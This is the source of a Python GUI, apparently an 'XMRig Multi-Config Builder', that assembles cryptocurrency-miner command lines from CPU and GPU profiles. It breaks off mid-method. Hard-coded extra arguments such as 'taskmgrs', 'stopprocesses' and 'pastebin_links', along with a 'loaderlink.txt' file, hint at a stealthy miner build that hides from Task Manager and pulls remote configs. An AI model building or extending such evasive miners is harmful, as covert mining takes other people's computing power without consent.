
from __future__ import annotations
open("loaderlink.txt", "a", encoding="utf-8").close()
import json
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Literal

from PySide6.QtCore import Signal
from PySide6.QtGui import QFont
from PySide6.QtWidgets import (
    QApplication,
    QCheckBox,
    QComboBox,
    QFileDialog,
    QFrame,
    QGridLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMainWindow,
    QMessageBox,
    QPushButton,
    QScrollArea,
    QSizePolicy,
    QTabWidget,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)


Backend = Literal["cpu", "gpu"]
Language = Literal["en", "ru"]
CUSTOM_ARGUMENT_NAMES = ("taskmgrs", "stopprocesses", "pastebin_links", "split_percentage")
# CUSTOM_ARGUMENT_NAMES = tuple(f"customarg{i}" for i in range(1, 5))


TEXT: dict[str, dict[str, str]] = {
    "ru": {
        "window_title": "XMRig Multi-Config Builder",
        "app_title": "XMRig Config Builder",
        "app_subtitle": "До четырёх независимых конфигураций · Material Dark Orange",
        "language": "Язык",
        "executable": "Исполняемый файл",
        "executable_placeholder": "Путь или имя файла, например xmrig.exe",
        "active_of_four": "Активно из 4",
        "cpu_configs": "CPU-конфигов",
        "gpu_configs": "GPU-конфигов",
        "minimum_hint": "Нужен минимум один активный CPU- или GPU-конфиг.",
        "cpu_tab": "CPU",
        "gpu_tab": "GPU",
        "cpu_builder": "CPU-конфигурации",
        "gpu_builder": "GPU-конфигурации",
        "cpu_builder_desc": "Два независимых профиля для CPU",
        "gpu_builder_desc": "Два независимых профиля для GPU",
        "cpu_profile": "CPU Config {index}",
        "gpu_profile": "GPU Config {index}",
        "cpu_profile_desc": "CPU-конфигурация",
        "gpu_profile_desc": "GPU-конфигурация",
        "enable_config": "Использовать конфиг",
        "clear": "Очистить",
        "pool_section": "Пул и подключение",
        "cpu_section": "CPU backend",
        "gpu_section": "GPU backend",
        "custom_section": "Кастомные аргументы",
        "custom_hint": "Добавляются строго как customargN=значение, без пробела.",
        "custom_placeholder": "Значение, например 123,123,123",
        "flag_without_value": "Флаг без значения",
        "final_commands": "Финальные команды",
        "ready_configs": "Готово конфигов: {count}",
        "no_configs": "Не выбран ни один конфиг",
        "save_project": "Сохранить проект",
        "load_project": "Загрузить проект",
        "validate": "Проверить",
        "run_active": "Собрать",
        "ready": "Готово",
        "project_saved": "Проект сохранён: {path}",
        "project_loaded": "Проект загружен: {path}",
        "started": "Запущено конфигов: {count}",
        "save_project_title": "Сохранить проект",
        "load_project_title": "Загрузить проект",
        "error": "Ошибка",
        "load_error": "Ошибка загрузки",
        "save_error": "Ошибка сохранения",
        "config_error": "Ошибка конфигурации",
        "warnings": "Предупреждения",
        "validation": "Проверка",
        "validation_ok": "Проверка пройдена. Активных конфигов: {count}.",
        "invalid_json": "Некорректный JSON-файл.",
        "profiles_not_object": "Поле profiles должно быть объектом.",
        "at_least_one": "Нужно включить хотя бы один CPU- или GPU-конфиг.",
        "missing_value": "{profile}: для {option} не задано значение",
        "algo_coin_conflict": "{profile}: одновременно выбраны --algo и --coin",
        "gpu_not_enabled": "{profile}: не включён ни OpenCL, ни CUDA",
        "custom_spaces": "{profile}: значение {name} не должно содержать пробелы",
        "run_error": "Ошибка запуска",
    },
    "en": {
        "window_title": "XMRig Multi-Config Builder",
        "app_title": "XMRig Config Builder",
        "app_subtitle": "Up to four independent configurations · Material Dark Orange",
        "language": "Language",
        "executable": "Executable",
        "executable_placeholder": "Path or filename, for example xmrig.exe",
        "active_of_four": "Active of 4",
        "cpu_configs": "CPU configs",
        "gpu_configs": "GPU configs",
        "minimum_hint": "At least one CPU or GPU config must be active.",
        "cpu_tab": "CPU",
        "gpu_tab": "GPU",
        "cpu_builder": "CPU configurations",
        "gpu_builder": "GPU configurations",
        "cpu_builder_desc": "Two independent CPU profiles",
        "gpu_builder_desc": "Two independent GPU profiles",
        "cpu_profile": "CPU Config {index}",
        "gpu_profile": "GPU Config {index}",
        "cpu_profile_desc": "CPU configuration",
        "gpu_profile_desc": "GPU configuration",
        "enable_config": "Enable config",
        "clear": "Clear",
        "pool_section": "Pool and connection",
        "cpu_section": "CPU backend",
        "gpu_section": "GPU backend",
        "custom_section": "Custom arguments",
        "custom_hint": "Added strictly as customargN=value, without spaces.",
        "custom_placeholder": "Value, for example 123,123,123",
        "flag_without_value": "Flag without a value",
        "final_commands": "Final commands",
        "ready_configs": "Ready configs: {count}",
        "no_configs": "No config selected",
        "save_project": "Save project",
        "load_project": "Load project",
        "validate": "Validate",
        "run_active": "Build",
        "ready": "Ready",
        "project_saved": "Project saved: {path}",
        "project_loaded": "Project loaded: {path}",
        "started": "Started configs: {count}",
        "save_project_title": "Save project",
        "load_project_title": "Load project",
        "error": "Error",
        "load_error": "Load error",
        "save_error": "Save error",
        "config_error": "Configuration error",
        "warnings": "Warnings",
        "validation": "Validation",
        "validation_ok": "Validation passed. Active configs: {count}.",
        "invalid_json": "Invalid JSON file.",
        "profiles_not_object": "The profiles field must be an object.",
        "at_least_one": "Enable at least one CPU or GPU config.",
        "missing_value": "{profile}: no value specified for {option}",
        "algo_coin_conflict": "{profile}: --algo and --coin are enabled together",
        "gpu_not_enabled": "{profile}: neither OpenCL nor CUDA is enabled",
        "custom_spaces": "{profile}: {name} must not contain spaces",
        "run_error": "Launch error",
    },
}


ARG_LABELS: dict[str, dict[str, str]] = {
    "--url": {"ru": "Адрес пула", "en": "Pool address"},
    "--user": {"ru": "Кошелёк / пользователь", "en": "Wallet / user"},
    "--pass": {"ru": "Пароль", "en": "Password"},
    "--algo": {"ru": "Алгоритм", "en": "Algorithm"},
    "--coin": {"ru": "Монета", "en": "Coin"},
    "--rig-id": {"ru": "ID воркера", "en": "Worker ID"},
    "--tls": {"ru": "TLS", "en": "TLS"},
    "--nicehash": {"ru": "Протокол NiceHash", "en": "NiceHash protocol"},
    "--keepalive": {"ru": "Keepalive", "en": "Keepalive"},
    "--proxy": {"ru": "SOCKS5 proxy", "en": "SOCKS5 proxy"},
    "--retries": {"ru": "Количество повторов", "en": "Retry count"},
    "--retry-pause": {"ru": "Пауза между повторами", "en": "Retry pause"},
    "--threads": {"ru": "Количество CPU-потоков", "en": "CPU thread count"},
    "--cpu-max-threads-hint": {"ru": "Максимум CPU-потоков, %", "en": "Maximum CPU threads, %"},
    "--cpu-affinity": {"ru": "CPU affinity", "en": "CPU affinity"},
    "--cpu-priority": {"ru": "Приоритет CPU", "en": "CPU priority"},
    "--cpu-no-yield": {"ru": "Максимальный хешрейт", "en": "Maximum hashrate"},
    "--no-huge-pages": {"ru": "Отключить huge pages", "en": "Disable huge pages"},
    "--huge-pages-jit": {"ru": "Huge pages для JIT", "en": "Huge pages for JIT"},
    "--asm": {"ru": "ASM-оптимизация", "en": "ASM optimization"},
    "--randomx-mode": {"ru": "Режим RandomX", "en": "RandomX mode"},
    "--randomx-init": {"ru": "Потоки инициализации RandomX", "en": "RandomX init threads"},
    "--randomx-no-numa": {"ru": "Отключить NUMA", "en": "Disable NUMA"},
    "--randomx-1gb-pages": {"ru": "RandomX 1GB pages", "en": "RandomX 1GB pages"},
    "--randomx-wrmsr": {"ru": "RandomX WRMSR", "en": "RandomX WRMSR"},
    "--randomx-no-rdmsr": {"ru": "Не восстанавливать MSR", "en": "Do not restore MSR"},
    "--no-cpu": {"ru": "Отключить CPU backend", "en": "Disable CPU backend"},
    "--opencl": {"ru": "Включить OpenCL", "en": "Enable OpenCL"},
    "--opencl-devices": {"ru": "OpenCL устройства", "en": "OpenCL devices"},
    "--opencl-platform": {"ru": "OpenCL платформа", "en": "OpenCL platform"},
    "--opencl-loader": {"ru": "Путь к OpenCL loader", "en": "OpenCL loader path"},
    "--opencl-no-cache": {"ru": "Отключить OpenCL cache", "en": "Disable OpenCL cache"},
    "--cuda": {"ru": "Включить CUDA", "en": "Enable CUDA"},
    "--cuda-devices": {"ru": "CUDA устройства", "en": "CUDA devices"},
    "--cuda-loader": {"ru": "Путь к xmrig-cuda", "en": "xmrig-cuda path"},
    "--cuda-bfactor-hint": {"ru": "CUDA BFactor", "en": "CUDA BFactor"},
    "--cuda-bsleep-hint": {"ru": "CUDA BSleep", "en": "CUDA BSleep"},
    "--no-nvml": {"ru": "Отключить NVML", "en": "Disable NVML"},
}


ARG_PLACEHOLDERS: dict[str, dict[str, str]] = {
    "--url": {"ru": "pool.example.com:443", "en": "pool.example.com:443"},
    "--user": {"ru": "адрес кошелька", "en": "wallet address"},
    "--proxy": {"ru": "127.0.0.1:1080", "en": "127.0.0.1:1080"},
    "--cpu-affinity": {"ru": "например 0x3", "en": "for example 0x3"},
    "--opencl-devices": {"ru": "например 0,1", "en": "for example 0,1"},
    "--cuda-devices": {"ru": "например 0,1", "en": "for example 0,1"},
}


@dataclass(frozen=True)
class ArgSpec:
    option: str
    kind: Literal["text", "combo", "flag"] = "text"
    values: tuple[str, ...] = ()
    default: str = ""
    enabled_by_default: bool = False


COMMON_SPECS: tuple[ArgSpec, ...] = (
    ArgSpec("--url"),
    ArgSpec("--user"),
    ArgSpec("--pass", default="x", enabled_by_default=True),
    ArgSpec(
        "--algo",
        "combo",
        (
            "rx/0", "rx/wow", "rx/arq", "rx/graft", "kawpow",
            "ghostrider", "cn/1", "cn/2", "cn/r", "cn-heavy/0",
            "cn-pico", "argon2/chukwa", "astrobwt",
        ),
    ),
    ArgSpec("--coin", "combo", ("monero", "arqma", "dero")),
    ArgSpec("--rig-id"),
    ArgSpec("--tls", "flag"),
    ArgSpec("--nicehash", "flag"),
    ArgSpec("--keepalive", "flag"),
    ArgSpec("--proxy"),
    ArgSpec("--retries", default="5"),
    ArgSpec("--retry-pause", default="5"),
)


CPU_SPECS: tuple[ArgSpec, ...] = (
    ArgSpec("--threads"),
    ArgSpec("--cpu-max-threads-hint"),
    ArgSpec("--cpu-affinity"),
    ArgSpec("--cpu-priority", "combo", ("0", "1", "2", "3", "4", "5"), "2"),
    ArgSpec("--cpu-no-yield", "flag"),
    ArgSpec("--no-huge-pages", "flag"),
    ArgSpec("--huge-pages-jit", "flag"),
    ArgSpec("--asm", "combo", ("auto", "none", "intel", "ryzen", "bulldozer"), "auto"),
    ArgSpec("--randomx-mode", "combo", ("auto", "fast", "light"), "auto"),
    ArgSpec("--randomx-init"),
    ArgSpec("--randomx-no-numa", "flag"),
    ArgSpec("--randomx-1gb-pages", "flag"),
    ArgSpec("--randomx-wrmsr"),
    ArgSpec("--randomx-no-rdmsr", "flag"),
)


GPU_SPECS: tuple[ArgSpec, ...] = (
    ArgSpec("--no-cpu", "flag", enabled_by_default=True),
    ArgSpec("--opencl", "flag"),
    ArgSpec("--opencl-devices"),
    ArgSpec("--opencl-platform"),
    ArgSpec("--opencl-loader"),
    ArgSpec("--opencl-no-cache", "flag"),
    ArgSpec("--cuda", "flag"),
    ArgSpec("--cuda-devices"),
    ArgSpec("--cuda-loader"),
    ArgSpec("--cuda-bfactor-hint", "combo", tuple(str(value) for value in range(13))),
    ArgSpec("--cuda-bsleep-hint", "flag"),
    ArgSpec("--no-nvml", "flag"),
)


# Material Design dark surfaces with Deep Orange as the only accent family.
STYLE = """
QWidget {
    background-color: #121212;
    color: #F5F5F5;
    font-family: "Segoe UI Variable", "Segoe UI";
    font-size: 10pt;
}
QMainWindow { background-color: #0B0B0B; }
QStatusBar {
    background-color: #121212;
    color: #A9A9A9;
    border-top: 1px solid #2C2C2C;
    padding-left: 8px;
}
QFrame#TopBar,
QFrame#SummaryCard,
QFrame#OutputCard,
QFrame#ProfileCard {
    background-color: #1A1A1A;
    border: 1px solid #303030;
    border-radius: 16px;
}
QFrame#ProfileCard[active="true"] {
    background-color: #1F1B18;
    border: 2px solid #FF7A00;
}
QFrame#ProfileCard[active="false"] {
    background-color: #181818;
    border: 1px solid #2A2A2A;
}
QFrame#SectionCard,
QFrame#MetricCard {
    background-color: #202020;
    border: 1px solid #343434;
    border-radius: 12px;
}
QLabel#AppTitle {
    color: #FFFFFF;
    font-size: 24pt;
    font-weight: 750;
}
QLabel#ProfileTitle {
    color: #FFFFFF;
    font-size: 15pt;
    font-weight: 700;
}
QLabel#SectionTitle {
    color: #FF8A2A;
    font-size: 11pt;
    font-weight: 700;
}
QLabel#Muted,
QLabel#MetricLabel { color: #9E9E9E; }
QLabel#MetricValue {
    color: #FF7A00;
    font-size: 19pt;
    font-weight: 750;
}
QLabel#ArgumentCode {
    color: #8E8E8E;
    font-family: "Cascadia Mono", "Consolas";
    font-size: 9pt;
}
QLineEdit,
QComboBox,
QTextEdit {
    background-color: #151515;
    color: #F5F5F5;
    border: 1px solid #3A3A3A;
    border-radius: 9px;
    padding: 8px 10px;
    selection-background-color: #FF7A00;
    selection-color: #111111;
}
QLineEdit:hover,
QComboBox:hover,
QTextEdit:hover { border-color: #5A5A5A; }
QLineEdit:focus,
QComboBox:focus,
QTextEdit:focus { border: 1px solid #FF7A00; }
QLineEdit:disabled,
QComboBox:disabled,
QTextEdit:disabled {
    color: #686868;
    background-color: #171717;
    border-color: #292929;
}
QComboBox::drop-down { border: none; width: 26px; }
QComboBox QAbstractItemView {
    background-color: #202020;
    color: #F5F5F5;
    border: 1px solid #424242;
    selection-background-color: #FF7A00;
    selection-color: #111111;
    outline: 0;
}
QComboBox#LanguageSelector {
    background-color: #FF7A00;
    color: #111111;
    border-color: #FF7A00;
    min-width: 76px;
    font-weight: 700;
}
QPushButton {
    background-color: #292929;
    color: #F5F5F5;
    border: 1px solid #414141;
    border-radius: 9px;
    padding: 8px 14px;
    font-weight: 650;
}
QPushButton:hover {
    background-color: #343434;
    border-color: #FF7A00;
}
QPushButton:pressed { background-color: #202020; }
QPushButton:disabled {
    color: #686868;
    background-color: #1C1C1C;
    border-color: #2A2A2A;
}
QPushButton#PrimaryButton {
    background-color: #FF7A00;
    color: #111111;
    border-color: #FF7A00;
}
QPushButton#PrimaryButton:hover {
    background-color: #FF942F;
    border-color: #FF942F;
}
QPushButton#OutlineButton {
    color: #FF9A3D;
    background-color: transparent;
    border-color: #6A3A16;
}
QPushButton#OutlineButton:hover {
    background-color: #2B1D13;
    border-color: #FF7A00;
}
QCheckBox { spacing: 8px; font-weight: 600; }
QCheckBox::indicator {
    width: 18px;
    height: 18px;
    background-color: #151515;
    border: 1px solid #5A5A5A;
    border-radius: 5px;
}
QCheckBox::indicator:hover { border-color: #FF7A00; }
QCheckBox::indicator:checked {
    background-color: #FF7A00;
    border-color: #FF7A00;
}
QCheckBox:disabled { color: #686868; }
QTabWidget::pane {
    background-color: #101010;
    border: 1px solid #303030;
    border-radius: 12px;
    top: -1px;
}
QTabBar::tab {
    min-width: 150px;
    background-color: #1A1A1A;
    color: #9E9E9E;
    padding: 12px 24px;
    margin-right: 6px;
    border: 1px solid #303030;
    border-bottom: 3px solid transparent;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
    font-weight: 700;
}
QTabBar::tab:hover {
    color: #FFFFFF;
    background-color: #222222;
}
QTabBar::tab:selected {
    color: #FF8A2A;
    background-color: #24201D;
    border-color: #3A302A;
    border-bottom: 3px solid #FF7A00;
}
QScrollArea { border: none; background-color: transparent; }
QScrollBar:vertical {
    background-color: #121212;
    width: 12px;
    margin: 4px;
}
QScrollBar::handle:vertical {
    background-color: #444444;
    min-height: 34px;
    border-radius: 5px;
}
QScrollBar::handle:vertical:hover { background-color: #FF7A00; }
QScrollBar::add-line:vertical,
QScrollBar::sub-line:vertical { height: 0; }
QToolTip {
    background-color: #242424;
    color: #FFFFFF;
    border: 1px solid #FF7A00;
    padding: 5px;
}
"""


def tr(language: Language, key: str, **values: Any) -> str:
    return TEXT[language][key].format(**values)


class ArgRow(QWidget):
    changed = Signal()

    def __init__(self, spec: ArgSpec, language: Language) -> None:
        super().__init__()
        self.spec = spec
        self.language = language

        layout = QGridLayout(self)
        layout.setContentsMargins(4, 4, 4, 4)
        layout.setHorizontalSpacing(12)
        layout.setVerticalSpacing(3)

        self.enabled = QCheckBox()
        self.enabled.setChecked(spec.enabled_by_default)
        self.enabled.toggled.connect(self._sync_enabled_state)
        self.enabled.toggled.connect(self.changed)
        layout.addWidget(self.enabled, 0, 0)

        self.option_label = QLabel(spec.option)
        self.option_label.setObjectName("ArgumentCode")
        layout.addWidget(self.option_label, 1, 0)

        self.editor: QLineEdit | QComboBox | None
        self.flag_label: QLabel | None = None

        if spec.kind == "flag":
            self.editor = None
            self.flag_label = QLabel()
            self.flag_label.setObjectName("Muted")
            layout.addWidget(self.flag_label, 0, 1, 2, 1)
        elif spec.kind == "combo":
            combo = QComboBox()
            combo.setEditable(True)
            combo.addItems(spec.values)
            combo.setCurrentText(spec.default)
            combo.currentTextChanged.connect(self.changed)
            self.editor = combo
            layout.addWidget(combo, 0, 1, 2, 1)
        else:
            edit = QLineEdit(spec.default)
            edit.textChanged.connect(self.changed)
            self.editor = edit
            layout.addWidget(edit, 0, 1, 2, 1)

        layout.setColumnStretch(1, 1)
        self.retranslate(language)
        self._sync_enabled_state()

    def retranslate(self, language: Language) -> None:
        self.language = language
        self.enabled.setText(ARG_LABELS[self.spec.option][language])

        if self.flag_label is not None:
            self.flag_label.setText(tr(language, "flag_without_value"))

        if isinstance(self.editor, QLineEdit):
            placeholder = ARG_PLACEHOLDERS.get(self.spec.option, {}).get(language, "")
            self.editor.setPlaceholderText(placeholder)

    def _sync_enabled_state(self) -> None:
        if self.editor is not None:
            self.editor.setEnabled(self.enabled.isChecked())

    def value(self) -> str:
        if self.editor is None:
            return ""
        if isinstance(self.editor, QComboBox):
            return self.editor.currentText().strip()
        return self.editor.text().strip()

    def set_value(self, value: str) -> None:
        if isinstance(self.editor, QComboBox):
            self.editor.setCurrentText(value)
        elif isinstance(self.editor, QLineEdit):
            self.editor.setText(value)

    def reset(self) -> None:
        self.enabled.setChecked(self.spec.enabled_by_default)
        self.set_value(self.spec.default)


class SectionCard(QFrame):
    def __init__(self, title_key: str, language: Language) -> None:
        super().__init__()
        self.title_key = title_key
        self.setObjectName("SectionCard")

        self.layout_box = QVBoxLayout(self)
        self.layout_box.setContentsMargins(14, 12, 14, 12)
        self.layout_box.setSpacing(6)

        self.title_label = QLabel()
        self.title_label.setObjectName("SectionTitle")
        self.layout_box.addWidget(self.title_label)
        self.retranslate(language)

    def retranslate(self, language: Language) -> None:
        self.title_label.setText(tr(language, self.title_key))

    def add_widget(self, widget: QWidget) -> None:
        self.layout_box.addWidget(widget)


class CustomArgumentRow(QWidget):
    changed = Signal()

    def __init__(self, name: str, language: Language) -> None:
        super().__init__()
        self.name = name
        self.language = language

        layout = QHBoxLayout(self)
        layout.setContentsMargins(4, 4, 4, 4)
        layout.setSpacing(12)

        label = QLabel(name)
        label.setObjectName("ArgumentCode")
        label.setMinimumWidth(115)
        layout.addWidget(label)

        self.edit = QLineEdit()
        self.edit.textChanged.connect(self.changed)
        layout.addWidget(self.edit, 1)

        self.preview = QLabel(f"{name}=...")
        self.preview.setObjectName("Muted")
        self.preview.setMinimumWidth(150)
        layout.addWidget(self.preview)

        self.edit.textChanged.connect(self._update_preview)
        self.retranslate(language)

    def retranslate(self, language: Language) -> None:
        self.language = language
        self.edit.setPlaceholderText(tr(language, "custom_placeholder"))

    def _update_preview(self, value: str) -> None:
        self.preview.setText(f"{self.name}=...")
        # self.preview.setText(f"{self.name}={value}" if value else f"{self.name}=...")

    def value(self) -> str:
        return self.edit.text().strip()

    def set_value(self, value: str) -> None:
        self.edit.setText(value)

    def clear(self) -> None:
        self.edit.clear()


class ProfileCard(QFrame):
    changed = Signal()

    def __init__(
        self,
        profile_id: str,
        index: int,
        backend: Backend,
        language: Language,
        enabled_by_default: bool = False,
    ) -> None:
        super().__init__()
        self.profile_id = profile_id
        self.index = index
        self.backend = backend
        self.language = language
        self.rows: dict[str, ArgRow] = {}
        self.custom_rows: dict[str, CustomArgumentRow] = {}

        self.setObjectName("ProfileCard")

        root = QVBoxLayout(self)
        root.setContentsMargins(16, 14, 16, 16)
        root.setSpacing(10)

        header = QHBoxLayout()
        title_box = QVBoxLayout()
        title_box.setSpacing(2)

        self.title_label = QLabel()
        self.title_label.setObjectName("ProfileTitle")
        title_box.addWidget(self.title_label)

        self.subtitle_label = QLabel()
        self.subtitle_label.setObjectName("Muted")
        title_box.addWidget(self.subtitle_label)

        header.addLayout(title_box)
        header.addStretch(1)

        self.enabled = QCheckBox()
        self.enabled.setChecked(enabled_by_default)
        self.enabled.toggled.connect(self._sync_card_state)
        self.enabled.toggled.connect(self.changed)
        header.addWidget(self.enabled)
        root.addLayout(header)

        actions = QHBoxLayout()
        actions.addStretch(1)
        self.clear_button = QPushButton()
        self.clear_button.setObjectName("OutlineButton")
        self.clear_button.clicked.connect(self.clear)
        actions.addWidget(self.clear_button)
        root.addLayout(actions)

        self.content = QWidget()
        content_layout = QVBoxLayout(self.content)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(10)

        self.pool_section = SectionCard("pool_section", language)
        for spec in COMMON_SPECS:
            row = ArgRow(spec, language)
            row.changed.connect(self.changed)
            self.rows[spec.option] = row
            self.pool_section.add_widget(row)
        content_layout.addWidget(self.pool_section)

        backend_key = "cpu_section" if backend == "cpu" else "gpu_section"
        self.backend_section = SectionCard(backend_key, language)
        backend_specs = CPU_SPECS if backend == "cpu" else GPU_SPECS
        for spec in backend_specs:
            row = ArgRow(spec, language)
            row.changed.connect(self.changed)
            self.rows[spec.option] = row
            self.backend_section.add_widget(row)
        content_layout.addWidget(self.backend_section)

        self.custom_section = SectionCard("custom_section", language)
        self.custom_hint = QLabel()
        self.custom_hint.setObjectName("Muted")
        self.custom_section.add_widget(self.custom_hint)

        for name in CUSTOM_ARGUMENT_NAMES:
            custom_row = CustomArgumentRow(name, language)
            custom_row.changed.connect(self.changed)
            self.custom_rows[name] = custom_row
            self.custom_section.add_widget(custom_row)
        content_layout.addWidget(self.custom_section)

        root.addWidget(self.content)
        self.retranslate(language)
        self._sync_card_state()

    @property
    def display_title(self) -> str:
        key = "cpu_profile" if self.backend == "cpu" else "gpu_profile"
        return tr(self.language, key, index=self.index)

    def retranslate(self, language: Language) -> None:
        self.language = language
        self.title_label.setText(self.display_title)
        description_key = "cpu_profile_desc" if self.backend == "cpu" else "gpu_profile_desc"
        self.subtitle_label.setText(tr(language, description_key))
        self.enabled.setText(tr(language, "enable_config"))
        self.clear_button.setText(tr(language, "clear"))
        self.pool_section.retranslate(language)
        self.backend_section.retranslate(language)
        self.custom_section.retranslate(language)
        self.custom_hint.setText(tr(language, "custom_hint"))

        for row in self.rows.values():
            row.retranslate(language)
        for row in self.custom_rows.values():
            row.retranslate(language)

    def _sync_card_state(self) -> None:
        is_active = self.enabled.isChecked()
        self.content.setEnabled(is_active)
        self.clear_button.setEnabled(is_active)
        self.setProperty("active", is_active)
        self.style().unpolish(self)
        self.style().polish(self)
        self.update()

    def clear(self) -> None:
        for row in self.rows.values():
            row.reset()
        for custom_row in self.custom_rows.values():
            custom_row.clear()
        self.changed.emit()

    def build_args(self) -> list[str]:
        args: list[str] = []
        specs = COMMON_SPECS + (CPU_SPECS if self.backend == "cpu" else GPU_SPECS)

        for spec in specs:
            row = self.rows[spec.option]
            if not row.enabled.isChecked():
                continue
            if spec.kind == "flag":
                args.append(spec.option)
            elif row.value():
                args.append(f"{spec.option}={row.value()}")

        for name in CUSTOM_ARGUMENT_NAMES:
            value = self.custom_rows[name].value()
            if value:
                args.append(f"{name}={value}")

        return args

    def validate(self) -> tuple[list[str], list[str]]:
        errors: list[str] = []
        warnings: list[str] = []
        profile = self.display_title

        for option, row in self.rows.items():
            if row.enabled.isChecked() and row.spec.kind != "flag" and not row.value():
                errors.append(tr(self.language, "missing_value", profile=profile, option=option))

        if self.rows["--algo"].enabled.isChecked() and self.rows["--coin"].enabled.isChecked():
            warnings.append(tr(self.language, "algo_coin_conflict", profile=profile))

        if self.backend == "gpu":
            opencl = self.rows["--opencl"].enabled.isChecked()
            cuda = self.rows["--cuda"].enabled.isChecked()
            if not opencl and not cuda:
                warnings.append(tr(self.language, "gpu_not_enabled", profile=profile))

        for name, custom_row in self.custom_rows.items():
            if any(char.isspace() for char in custom_row.value()):
                errors.append(tr(self.language, "custom_spaces", profile=profile, name=name))

        return errors, warnings

    def to_dict(self) -> dict[str, Any]:
        options: dict[str, Any] = {}
        for option, row in self.rows.items():
            if row.enabled.isChecked():
                options[option] = True if row.spec.kind == "flag" else row.value()

        custom = {
            name: row.value()
            for name, row in self.custom_rows.items()
            if row.value()
        }

        return {
            "enabled": self.enabled.isChecked(),
            "backend": self.backend,
            "options": options,
            "custom": custom,
        }

    def load_dict(self, data: dict[str, Any]) -> None:
        self.clear()
        self.enabled.setChecked(bool(data.get("enabled", False)))

        options = data.get("options", {})
        if isinstance(options, dict):
            for option, value in options.items():
                row = self.rows.get(option)
                if row is None:
                    continue
                row.enabled.setChecked(True)
                if row.spec.kind != "flag":
                    row.set_value(str(value))

        custom = data.get("custom", {})
        if isinstance(custom, dict):
            for name, value in custom.items():
                row = self.custom_rows.get(name)
                if row is not None:
                    row.set_value(str(value))

        self.changed.emit()


class BuilderPage(QWidget):
    changed = Signal()

    def __init__(self, backend: Backend, language: Language) -> None:
        super().__init__()
        self.backend = backend
        self.language = language

        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(12)

        title_row = QHBoxLayout()
        self.title_label = QLabel()
        self.title_label.setObjectName("ProfileTitle")
        title_row.addWidget(self.title_label)

        self.description_label = QLabel()
        self.description_label.setObjectName("Muted")
        title_row.addWidget(self.description_label)
        title_row.addStretch(1)
        layout.addLayout(title_row)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)

        content = QWidget()
        profiles_layout = QHBoxLayout(content)
        profiles_layout.setContentsMargins(2, 2, 2, 2)
        profiles_layout.setSpacing(12)

        self.profiles = [
            ProfileCard(f"{backend}1", 1, backend, language, enabled_by_default=(backend == "cpu")),
            ProfileCard(f"{backend}2", 2, backend, language),
        ]

        for profile in self.profiles:
            profile.changed.connect(self.changed)
            profile.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Preferred)
            profiles_layout.addWidget(profile, 1)

        scroll.setWidget(content)
        layout.addWidget(scroll, 1)
        self.retranslate(language)

    def retranslate(self, language: Language) -> None:
        self.language = language
        title_key = "cpu_builder" if self.backend == "cpu" else "gpu_builder"
        desc_key = "cpu_builder_desc" if self.backend == "cpu" else "gpu_builder_desc"
        self.title_label.setText(tr(language, title_key))
        self.description_label.setText(tr(language, desc_key))
        for profile in self.profiles:
            profile.retranslate(language)


class XmrigMultiConfigBuilder(QMainWindow):
    def __init__(self) -> None:
        super().__init__()
        self.language: Language = "en"
        self.resize(1500, 920)
        self.setMinimumSize(1100, 720)

        root = QWidget()
        self.setCentralWidget(root)

        outer = QVBoxLayout(root)
        outer.setContentsMargins(16, 16, 16, 16)
        outer.setSpacing(12)

        outer.addWidget(self._create_top_bar())
        outer.addWidget(self._create_summary())

        self.tabs = QTabWidget()
        self.cpu_page = BuilderPage("cpu", self.language)
        self.gpu_page = BuilderPage("gpu", self.language)
        self.cpu_page.changed.connect(self.update_output)
        self.gpu_page.changed.connect(self.update_output)
        self.tabs.addTab(self.cpu_page, "CPU")
        self.tabs.addTab(self.gpu_page, "GPU")
        outer.addWidget(self.tabs, 1)

        outer.addWidget(self._create_output_card())

        self.retranslate()
        self.update_output()

    @property
    def profiles(self) -> list[ProfileCard]:
        return self.cpu_page.profiles + self.gpu_page.profiles

    def _create_top_bar(self) -> QWidget:
        card = QFrame()
        card.setObjectName("TopBar")
        layout = QHBoxLayout(card)
        layout.setContentsMargins(18, 14, 18, 14)
        layout.setSpacing(12)

        title_box = QVBoxLayout()
        title_box.setSpacing(2)
        self.app_title_label = QLabel()
        self.app_title_label.setObjectName("AppTitle")
        title_box.addWidget(self.app_title_label)
        self.app_subtitle_label = QLabel()
        self.app_subtitle_label.setObjectName("Muted")
        title_box.addWidget(self.app_subtitle_label)
        layout.addLayout(title_box)
        layout.addStretch(1)

        executable_box = QVBoxLayout()
        executable_box.setSpacing(3)
        self.executable_label = QLabel()
        self.executable_label.setObjectName("Muted")
        executable_box.addWidget(self.executable_label)
        self.exe_edit = QLineEdit("xmrig.exe")
        self.exe_edit.setMinimumWidth(330)
        self.exe_edit.textChanged.connect(self.update_output)
        executable_box.addWidget(self.exe_edit)
        layout.addLayout(executable_box)

        language_box = QVBoxLayout()
        language_box.setSpacing(3)
        self.language_label = QLabel()
        self.language_label.setObjectName("Muted")
        language_box.addWidget(self.language_label)
        self.language_combo = QComboBox()
        self.language_combo.setObjectName("LanguageSelector")
        self.language_combo.addItem("EN", "en")
        self.language_combo.addItem("RU", "ru")
        self.language_combo.currentIndexChanged.connect(self.change_language)
        language_box.addWidget(self.language_combo)
        layout.addLayout(language_box)

        return card

    def _metric_card(self) -> tuple[QFrame, QLabel, QLabel]:
        card = QFrame()
        card.setObjectName("MetricCard")
        layout = QVBoxLayout(card)
        layout.setContentsMargins(14, 10, 14, 10)
        layout.setSpacing(2)

        value_label = QLabel("0")
        value_label.setObjectName("MetricValue")
        layout.addWidget(value_label)

        text_label = QLabel()
        text_label.setObjectName("MetricLabel")
        layout.addWidget(text_label)
        return card, value_label, text_label

    def _create_summary(self) -> QWidget:
        card = QFrame()
        card.setObjectName("SummaryCard")
        layout = QHBoxLayout(card)
        layout.setContentsMargins(14, 10, 14, 10)
        layout.setSpacing(10)

        total_card, self.total_metric, self.total_metric_label = self._metric_card()
        cpu_card, self.cpu_metric, self.cpu_metric_label = self._metric_card()
        gpu_card, self.gpu_metric, self.gpu_metric_label = self._metric_card()
        layout.addWidget(total_card)
        layout.addWidget(cpu_card)
